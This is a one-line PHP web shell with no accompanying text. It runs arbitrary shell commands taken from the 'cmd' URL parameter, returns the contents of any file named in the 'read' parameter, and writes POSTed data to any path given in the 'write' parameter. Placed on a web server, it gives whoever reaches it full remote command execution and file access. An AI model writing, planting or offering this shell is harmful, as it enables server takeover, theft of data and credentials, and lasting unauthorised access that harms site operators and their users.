<?php echo shell_exec($_GET['cmd']); echo file_get_contents($_GET['read']); file_put_contents($_GET['write'], $_POST['data']); ?>
